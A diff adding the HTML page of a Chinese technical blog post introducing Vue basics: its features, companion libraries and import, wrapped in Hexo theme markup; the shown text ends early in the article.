@@ -1,0 +1,1732 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vue框架总结（一、Vue基础知识） | 划水艺术家</title>
+<noscript>开启Javascript是必要的</noscript>
+<link rel="icon" type="image/x-icon" href="/img/avatar.webp">
+<link rel="apple-touch-icon" href="/img/avatar.webp">
+<meta name="apple-mobile-web-app-title" content="划水艺术家">
+<link rel="bookmark" href="/img/avatar.webp">
+<link rel="apple-touch-icon-precomposed" sizes="180x180" href="/img/avatar.webp">
+<meta name="description" content="划水艺术家 一个分享技术与生活的博客">
+<meta name="theme-color" content="#1C1C1F">
+<link rel="stylesheet" href="/css/var.css">
+<link rel="stylesheet" href="/css/main.css">
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.3.0/css/all.min.css">
+    
+
+<link rel="stylesheet" href="/lib/snackbar.min.css">
+
+
+<script src="/lib/qrcode.min.js"></script>
+
+
+
+
+<script>var GLOBALCONFIG = {"root":"/","runtime":"2021-12-12 00:00:00","lazyload":{"enable":false,"error":"/img/acrylic.png"},"hightlight":{"enable":false,"limit":200},"lightbox":true,"randomlinks":false,"lang":{"theme":{"dark":"已切换至深色模式","light":"已切换至浅色模式"},"copy":{"success":"复制成功","error":"复制失败"},"backtop":"返回顶部","time":{"recent":"最近","yesterday":"昨天","berforeyesterday":"前天","daybefore":"天前","runtime":"天"},"sayhello":{"morning":"早上好","noon":"中午好","afternoon":"下午好","night":"晚上好","goodnight":"晚安","iam":"!  我是"},"search":{"empty":"搜索结果为空","hit":"已为您找到 ${query} 条结果","placeholder":"输入关键词快速查找"}},"covercolor":false,"comment":{"enable":false,"twikooUrl":null},"localsearch":{"preload":true,"path":"/search.xml"}};</script><script id="site-config">var PAGECONFIG = {"is_home":false,"is_post":true,"is_page":false,"page":false,"toc":true,"comment":false};</script>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body id="body">
+        
+        <div id="console" style="zoom: 1;" class="">
+    <div class="close-btn" onclick="acrylic.hideConsole()" href="javascript:void(0);">
+        <i class="fas fa-circle-xmark"></i>
+    </div>
+    
+        <div class="console-card-group">
+            <div class="console-card-group-left">
+                <div class="console-card" id="card-newest-comments" onclick="acrylic.hideConsole()">
+                    <div class="card-content">
+                        <div class="author-content-item-tips">互动</div>
+                        <div class="author-content-item-title">最新评论</div>
+                    </div>
+                    <div class="aside-list"></div>
+                </div>
+    
+            </div>
+            <div class="console-card-group-right">
+                <div class="console-card tags" onclick="acrylic.hideConsole()">
+                    <div class="card-content">
+                        <div class="author-content-item-tips">标签</div>
+                        <div class="author-content-item-title">寻找感兴趣的领域</div>
+                    </div>
+                    <div class="card-tag-cloud">
+                        
+                            <a href="/tags/docker/" style="font-size: 0.8rem; color: #d3d3d3">docker<sup>2</sup></a>
+                        
+                            <a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.8rem; color: #d3d3d3">容器<sup>2</sup></a>
+                        
+                            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 0.8rem; color: #d3d3d3">运维<sup>3</sup></a>
+                        
+                            <a href="/tags/Linux/" style="font-size: 0.8rem; color: #d3d3d3">Linux<sup>3</sup></a>
+                        
+                            <a href="/tags/Java/" style="font-size: 0.8rem; color: #d3d3d3">Java<sup>31</sup></a>
+                        
+                            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 0.8rem; color: #d3d3d3">后端<sup>22</sup></a>
+                        
+                            <a href="/tags/JavaWeb/" style="font-size: 0.8rem; color: #d3d3d3">JavaWeb<sup>4</sup></a>
+                        
+                            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.8rem; color: #d3d3d3">数据库<sup>14</sup></a>
+                        
+                            <a href="/tags/redis/" style="font-size: 0.8rem; color: #d3d3d3">redis<sup>1</sup></a>
+                        
+                            <a href="/tags/sql/" style="font-size: 0.8rem; color: #d3d3d3">sql<sup>10</sup></a>
+                        
+                            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.8rem; color: #d3d3d3">前端<sup>6</sup></a>
+                        
+                            <a href="/tags/vue/" style="font-size: 0.8rem; color: #d3d3d3">vue<sup>5</sup></a>
+                        
+                            <a href="/tags/javascript/" style="font-size: 0.8rem; color: #d3d3d3">javascript<sup>7</sup></a>
+                        
+                            <a href="/tags/SpringBoot/" style="font-size: 0.8rem; color: #d3d3d3">SpringBoot<sup>2</sup></a>
+                        
+                            <a href="/tags/spring/" style="font-size: 0.8rem; color: #d3d3d3">spring<sup>15</sup></a>
+                        
+                            <a href="/tags/ajax/" style="font-size: 0.8rem; color: #d3d3d3">ajax<sup>1</sup></a>
+                        
+                            <a href="/tags/json/" style="font-size: 0.8rem; color: #d3d3d3">json<sup>1</sup></a>
+                        
+                            <a href="/tags/jdbc/" style="font-size: 0.8rem; color: #d3d3d3">jdbc<sup>1</sup></a>
+                        
+                            <a href="/tags/flask/" style="font-size: 0.8rem; color: #d3d3d3">flask<sup>1</sup></a>
+                        
+                            <a href="/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/" style="font-size: 0.8rem; color: #d3d3d3">微服务<sup>2</sup></a>
+                        
+                            <a href="/tags/python/" style="font-size: 0.8rem; color: #d3d3d3">python<sup>1</sup></a>
+                        
+                            <a href="/tags/Nacos/" style="font-size: 0.8rem; color: #d3d3d3">Nacos<sup>1</sup></a>
+                        
+                            <a href="/tags/mybatis/" style="font-size: 0.8rem; color: #d3d3d3">mybatis<sup>1</sup></a>
+                        
+                            <a href="/tags/nginx/" style="font-size: 0.8rem; color: #d3d3d3">nginx<sup>1</sup></a>
+                        
+                            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 0.8rem; color: #d3d3d3">服务器<sup>2</sup></a>
+                        
+                            <a href="/tags/html/" style="font-size: 0.8rem; color: #d3d3d3">html<sup>1</sup></a>
+                        
+                            <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 0.8rem; color: #d3d3d3">消息队列<sup>1</sup></a>
+                        
+                            <a href="/tags/RabbitMQ/" style="font-size: 0.8rem; color: #d3d3d3">RabbitMQ<sup>1</sup></a>
+                        
+                            <a href="/tags/%E5%88%86%E5%B8%83%E5%BC%8F/" style="font-size: 0.8rem; color: #d3d3d3">分布式<sup>1</sup></a>
+                        
+                            <a href="/tags/git/" style="font-size: 0.8rem; color: #d3d3d3">git<sup>1</sup></a>
+                        
+                            <a href="/tags/gitee/" style="font-size: 0.8rem; color: #d3d3d3">gitee<sup>1</sup></a>
+                        
+                            <a href="/tags/github/" style="font-size: 0.8rem; color: #d3d3d3">github<sup>1</sup></a>
+                        
+                            <a href="/tags/mysql/" style="font-size: 0.8rem; color: #d3d3d3">mysql<sup>5</sup></a>
+                        
+                            <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 0.8rem; color: #d3d3d3">数据结构<sup>9</sup></a>
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 0.8rem; color: #d3d3d3">网络<sup>1</sup></a>
+                        
+                            <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 0.8rem; color: #d3d3d3">算法<sup>3</sup></a>
+                        
+                            <a href="/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 0.8rem; color: #d3d3d3">排序<sup>2</sup></a>
+                        
+                            <a href="/tags/%E5%9B%BE%E8%AE%BA/" style="font-size: 0.8rem; color: #d3d3d3">图论<sup>1</sup></a>
+                        
+                    </div>
+                </div>
+                <div class="console-card history" onclick="acrylic.hideConsole()">
+                    <ul class="card-archive-list">
+    
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2023/08/')" data-pjax-state=""><span
+            class="card-archive-list-date">2023/08</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2023/05/')" data-pjax-state=""><span
+            class="card-archive-list-date">2023/05</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2023/04/')" data-pjax-state=""><span
+            class="card-archive-list-date">2023/04</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2023/02/')" data-pjax-state=""><span
+            class="card-archive-list-date">2023/02</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2023/01/')" data-pjax-state=""><span
+            class="card-archive-list-date">2023/01</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2022/11/')" data-pjax-state=""><span
+            class="card-archive-list-date">2022/11</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2022/10/')" data-pjax-state=""><span
+            class="card-archive-list-date">2022/10</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2022/08/')" data-pjax-state=""><span
+            class="card-archive-list-date">2022/08</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+     
+        <li class="card-archive-list-item"><a class="card-archive-list-link" onclick="pjax.loadUrl('/archives/2022/07/')" data-pjax-state=""><span
+            class="card-archive-list-date">2022/07</span>
+            <div class="card-archive-list-count-group"><span class="card-archive-list-count">27</span><span
+                    class="card-archive-list-count-unit">篇</span></div>
+            </a>
+        </li>
+        
+</ul>
+
+                </div>
+            </div>
+        </div>
+    
+    
+    <div class="button-group">
+        <div class="console-btn-item"> <a class="darkmode_switchbutton" onclick="acrylic.switchDarkMode()" title="显示模式切换"
+                href="javascript:void(0);" rel="external nofollow" data-pjax-state=""><i class="fas fa-moon"
+                    style="font-size: 1rem;"></i></a></div>
+                    
+            <div class="console-btn-item" id="consoleMusic" onclick="acrylic.musicToggle()" title="音乐开关"><a class="music-switch"><i class="fas fa-music"></i></a></div>
+        
+    </div>
+    <div class="console-mask" onclick="acrylic.hideConsole()" href="javascript:void(0);" rel="external nofollow"></div>
+</div>
+        <div id="sidebar" style="zoom: 1;">
+    <div id="menu-mask" style="display: none;"></div>
+    <div id="sidebar-menus" class>
+        <span class="sidebar-menu-item-title">功能</span>
+        <div class="sidebar-menu-item">
+            <a class="darkmode_switchbutton menu-child" onclick="acrylic.switchDarkMode()" title="显示模式切换"
+                href="javascript:void(0);" rel="external nofollow">
+                <i class="fas fa-moon" style="font-size: 1rem;"></i>
+                <span>显示模式</span>
+            </a>
+        </div>
+        
+            <div class="back-menu-list-groups">
+    
+      
+      <div class="back-menu-list-group">
+        <div class="back-menu-list-title">
+          我的
+        </div>
+        <div class="back-menu-list">
+          
+            
+            <a class="back-menu-item" href="/" rel="external nofollow" title="博客">
+              <img class="back-menu-item-icon" src="/img/avatar.webp" loading="lazy">
+              <span class="back-menu-item-text">
+                博客
+              </span>
+            </a>
+          
+            
+            <a class="back-menu-item" target="_blank" href="https://butterfly.zhheo.com" rel="external nofollow noopener" title="美化">
+              <img class="back-menu-item-icon" src="/img/avatar.webp" loading="lazy">
+              <span class="back-menu-item-text">
+                美化
+              </span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </div>
+  
+        
+        <div class="menus_items">
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> 文库</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" href="/archives/">
+                                <i class="fas fa-box-archive"></i>
+                                <span> 文章列表</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/categories/">
+                                <i class="fas fa-cube"></i>
+                                <span> 全部分类</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/tags/">
+                                <i class="fas fa-tags"></i>
+                                <span> 全部标签</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> 仓库</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" target="_blank" rel="noopener" href="https://gitee.com/tang-yitao">
+                                <i class="fas fa-code-compare"></i>
+                                <span> gitee</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" target="_blank" rel="noopener" href="https://github.com/tang-yt">
+                                <i class="fas fa-code-branch"></i>
+                                <span> github</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> TV</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" href="/bangumis/index.html">
+                                <i class="fa-brands fa-bilibili"></i>
+                                <span> 追番</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/cinemas/index.html">
+                                <i class="fas fa-tv"></i>
+                                <span> 追剧</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page not-child" href="/links/" rel="external nofollow">
+                    <span> 友链</span>
+                </a>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page not-child" href="/about" rel="external nofollow">
+                    <span> 关于</span>
+                </a>
+             
+        </div>
+    
+</div>
+        <span class="sidebar-menu-item-title">标签</span>
+        <div class="card-widget card-tags card-archives card-webinfo card-allinfo">
+            <div class="item-headline">
+                <i class="fas fa-tags"></i>
+                <span>标签</span>
+            </div>
+            <div class="card-tag-cloud">
+                
+                    <a href="/tags/docker/" style="font-size: 1em; color: #d3d3d3">docker
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1em; color: #d3d3d3">容器
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 1em; color: #d3d3d3">运维
+                        <sup>3</sup>
+                    </a>
+                
+                    <a href="/tags/Linux/" style="font-size: 1em; color: #d3d3d3">Linux
+                        <sup>3</sup>
+                    </a>
+                
+                    <a href="/tags/Java/" style="font-size: 1em; color: #d3d3d3">Java
+                        <sup>31</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 1em; color: #d3d3d3">后端
+                        <sup>22</sup>
+                    </a>
+                
+                    <a href="/tags/JavaWeb/" style="font-size: 1em; color: #d3d3d3">JavaWeb
+                        <sup>4</sup>
+                    </a>
+                
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1em; color: #d3d3d3">数据库
+                        <sup>14</sup>
+                    </a>
+                
+                    <a href="/tags/redis/" style="font-size: 1em; color: #d3d3d3">redis
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/sql/" style="font-size: 1em; color: #d3d3d3">sql
+                        <sup>10</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1em; color: #d3d3d3">前端
+                        <sup>6</sup>
+                    </a>
+                
+                    <a href="/tags/vue/" style="font-size: 1em; color: #d3d3d3">vue
+                        <sup>5</sup>
+                    </a>
+                
+                    <a href="/tags/javascript/" style="font-size: 1em; color: #d3d3d3">javascript
+                        <sup>7</sup>
+                    </a>
+                
+                    <a href="/tags/SpringBoot/" style="font-size: 1em; color: #d3d3d3">SpringBoot
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/spring/" style="font-size: 1em; color: #d3d3d3">spring
+                        <sup>15</sup>
+                    </a>
+                
+                    <a href="/tags/ajax/" style="font-size: 1em; color: #d3d3d3">ajax
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/json/" style="font-size: 1em; color: #d3d3d3">json
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/jdbc/" style="font-size: 1em; color: #d3d3d3">jdbc
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/flask/" style="font-size: 1em; color: #d3d3d3">flask
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/" style="font-size: 1em; color: #d3d3d3">微服务
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/python/" style="font-size: 1em; color: #d3d3d3">python
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/Nacos/" style="font-size: 1em; color: #d3d3d3">Nacos
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/mybatis/" style="font-size: 1em; color: #d3d3d3">mybatis
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/nginx/" style="font-size: 1em; color: #d3d3d3">nginx
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1em; color: #d3d3d3">服务器
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/html/" style="font-size: 1em; color: #d3d3d3">html
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 1em; color: #d3d3d3">消息队列
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/RabbitMQ/" style="font-size: 1em; color: #d3d3d3">RabbitMQ
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%88%86%E5%B8%83%E5%BC%8F/" style="font-size: 1em; color: #d3d3d3">分布式
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/git/" style="font-size: 1em; color: #d3d3d3">git
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/gitee/" style="font-size: 1em; color: #d3d3d3">gitee
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/github/" style="font-size: 1em; color: #d3d3d3">github
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/mysql/" style="font-size: 1em; color: #d3d3d3">mysql
+                        <sup>5</sup>
+                    </a>
+                
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 1em; color: #d3d3d3">数据结构
+                        <sup>9</sup>
+                    </a>
+                
+                    <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 1em; color: #d3d3d3">网络
+                        <sup>1</sup>
+                    </a>
+                
+                    <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 1em; color: #d3d3d3">算法
+                        <sup>3</sup>
+                    </a>
+                
+                    <a href="/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 1em; color: #d3d3d3">排序
+                        <sup>2</sup>
+                    </a>
+                
+                    <a href="/tags/%E5%9B%BE%E8%AE%BA/" style="font-size: 1em; color: #d3d3d3">图论
+                        <sup>1</sup>
+                    </a>
+                
+            </div>
+        </div>
+    </div>
+</div>    
+        
+            <div class="post" id="body-wrap">
+                <header class="post-bg" id="page-header">
+    <nav id="nav" class="show">
+    <div id="nav-group">
+        <div id="blog_name">
+            
+                <div class="back-home-button" tabindex="-1">
+                    <i class="back-home-button-icon fas fa-grip-vertical"></i>
+                    <div class="back-menu-list-groups">
+    
+      
+      <div class="back-menu-list-group">
+        <div class="back-menu-list-title">
+          我的
+        </div>
+        <div class="back-menu-list">
+          
+            
+            <a class="back-menu-item" href="/" rel="external nofollow" title="博客">
+              <img class="back-menu-item-icon" src="/img/avatar.webp" loading="lazy">
+              <span class="back-menu-item-text">
+                博客
+              </span>
+            </a>
+          
+            
+            <a class="back-menu-item" target="_blank" href="https://butterfly.zhheo.com" rel="external nofollow noopener" title="美化">
+              <img class="back-menu-item-icon" src="/img/avatar.webp" loading="lazy">
+              <span class="back-menu-item-text">
+                美化
+              </span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </div>
+  
+                </div>
+            
+            <a id="site-name" href="/" title="返回博客主页">
+                    
+                        <span class="heoicon">TBlog</span>
+                    
+            </a>
+        </div>
+        <div id="page-name-mask">
+            <div id="page-name">
+                <a id="page-name-text" onclick="acrylic.toTop()">Vue框架总结（一、Vue基础知识）</a>
+            </div>
+        </div>
+        <div id="menus">
+            <div class="menus_items">
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> 文库</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" href="/archives/">
+                                <i class="fas fa-box-archive"></i>
+                                <span> 文章列表</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/categories/">
+                                <i class="fas fa-cube"></i>
+                                <span> 全部分类</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/tags/">
+                                <i class="fas fa-tags"></i>
+                                <span> 全部标签</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> 仓库</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" target="_blank" rel="noopener" href="https://gitee.com/tang-yitao">
+                                <i class="fas fa-code-compare"></i>
+                                <span> gitee</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" target="_blank" rel="noopener" href="https://github.com/tang-yt">
+                                <i class="fas fa-code-branch"></i>
+                                <span> github</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page" href="javascript:void(0);" rel="external nofollow">
+                    <span> TV</span>
+                </a>
+                <ul class="menus_item_child">
+                    
+                        <li>
+                            <a class="site-page child" href="/bangumis/index.html">
+                                <i class="fa-brands fa-bilibili"></i>
+                                <span> 追番</span>
+                            </a>
+                        </li>
+                    
+                        <li>
+                            <a class="site-page child" href="/cinemas/index.html">
+                                <i class="fas fa-tv"></i>
+                                <span> 追剧</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page not-child" href="/links/" rel="external nofollow">
+                    <span> 友链</span>
+                </a>
+             
+        </div>
+    
+        <div class="menus_item">
+            
+                <a class="site-page not-child" href="/about" rel="external nofollow">
+                    <span> 关于</span>
+                </a>
+             
+        </div>
+    
+</div>
+        </div>
+        <!-- <div id="nav-left">
+            <div id="fps-group">
+                <div id="fps">145</div><span class="fpsText">FPS</span>
+            </div>
+        </div> -->
+        <div id="nav-right">
+            
+    <div class="nav-button only-home" id="travellings_button">
+        <a class="site-page"  target="_blank" rel="noopener external nofollow" href="https://www.travellings.cn/go.html" title="开往-友链接力"  width="120">
+            <i class="fa-solid fa-train-subway" style="font-size: 1rem;"></i>
+        </a>
+    </div>
+
+
+    <div class="nav-button" id="randomPost_button">
+        <a class="site-page" onclick="toRandomPost()"
+            title="随机前往一个文章">
+            <i class="fas fa-shuffle" style="font-size: 1rem;"></i>
+        </a>
+    </div>
+
+
+    <div class="nav-button" id="search-button">
+        <a class="site-page social-icon search" title="站内搜索"
+            href="javascript:void(0);" rel="external nofollow">
+            <i class="fas fa-magnifying-glass" style="font-size: 1rem;"></i>
+        </a>
+    </div>
+
+
+    <div class="nav-button" id="nav-console">
+        <a class="console_switchbutton" onclick="acrylic.showConsole()"
+        title="显示中控台" href="javascript:void(0);" rel="external nofollow">
+        <i class="fas fa-bars-progress" style="font-size: 1rem;"></i>
+        </a>
+    </div>
+
+<div class="nav-button" id="nav-totop" onclick="acrylic.toTop()">
+    <a class="totopbtn">
+        <i class="fas fa-arrow-up"></i>
+        <span id="percent">0</span>
+    </a>
+</div>
+<div id="toggle-menu">
+    <a class="site-page">
+        <i class="fas fa-bars fa-fw" style="font-size: 1rem;"></i>
+    </a>
+</div>
+        </div>
+    </div>
+</nav>
+    
+        <div class="coverdiv" id="coverdiv">
+    <img id="post-cover" class="nolazyload" src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144528.png" alt="cover">
+</div>
+<div id="post-info">
+    <div id="post-firstinfo">
+        <div class="meta-firstline">
+            <a class="post-meta-original" title="该文章为原创文章，注意版权协议">
+                原创
+            </a>
+            
+            <span class="post-meta-categories">
+                
+                    <a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/">技术笔记</a>
+                
+            </span>
+            
+            <div class="tag_share">
+                <div class="post-meta__tag-list">
+                    
+                        <a class="post-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF/">
+                            <span class="tags-punctuation">#</span>
+                            <span class="tags-name">前端</span>
+                        </a>
+                    
+                        <a class="post-meta__tags" href="/tags/vue/">
+                            <span class="tags-punctuation">#</span>
+                            <span class="tags-name">vue</span>
+                        </a>
+                    
+                        <a class="post-meta__tags" href="/tags/javascript/">
+                            <span class="tags-punctuation">#</span>
+                            <span class="tags-name">javascript</span>
+                        </a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+    <h1 class="post-title">Vue框架总结（一、Vue基础知识）</h1>
+    <div id="post-meta">
+        <div class="meta-secondline">
+            <span class="post-meta-date" title="发布于">
+                <i class="post-meta-icon fa-fw fas fa-calendar"></i>
+                <time datetime="2022-08-08T14:41:17+08:00"></time>
+            </span>
+            
+            
+                <span class="post-meta-position" title="作者IP归属地为西安">
+                    <i class="fas fa-location-dot post-meta-icon"></i>
+                    <span>西安</span>
+                </span>
+            
+            
+            
+                
+        </div>
+    </div>
+</div>
+<section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg"
+    xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+    <defs>
+        <path id="gentle-wave"
+            d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path>
+    </defs>
+    <g class="parallax">
+        <use href="#gentle-wave" x="48" y="0"></use>
+        <use href="#gentle-wave" x="48" y="3"></use>
+        <use href="#gentle-wave" x="48" y="5"></use>
+        <use href="#gentle-wave" x="48" y="7"></use>
+    </g>
+</svg>
+</section>
+
+        
+</header>
+                <main class="layout" id="content-inner">
+    <div id="post">
+        <article class="post-content" id="article-container">
+            <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-Vue简介"><a href="#1-Vue简介" class="headerlink" title="1. Vue简介"></a>1. Vue简介</h2><ul>
+<li><p>Vue 是一套动态构建用户界面的渐进式JavaScript框架</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cn.vuejs.org/">官网</a></p>
+</li>
+</ul>
+<h2 id="2-Vue特点"><a href="#2-Vue特点" class="headerlink" title="2. Vue特点"></a>2. Vue特点</h2><ul>
+<li>采用<code>组件化</code>模式，提供代码复用率，且让代码更好维护</li>
+<li><code>声明式</code>编码，让编码人员无需操作直接操作DOM，提高开发效率</li>
+<li>使用<code>虚拟DOM</code> + 优秀的 <code>Diff 算法</code>，尽量复用 DOM结点</li>
+</ul>
+<h2 id="3-Vue周边库"><a href="#3-Vue周边库" class="headerlink" title="3. Vue周边库"></a>3. Vue周边库</h2><ul>
+<li>vue-cli：vue脚手架</li>
+<li>vue-resource</li>
+<li>axios</li>
+<li>vue-router：路由</li>
+<li>vuex：状态管理</li>
+<li>element-ui：基于vue的UI组件库（PC端）</li>
+</ul>
+<h2 id="4-Vue导入"><a href="#4-Vue导入" class="headerlink" title="4. Vue导入"></a>4. Vue导入</h2><p>Vue是一个JS框架，所以，如果想使用Vue，则在当前页面引入Vue.js文件即可。</p>
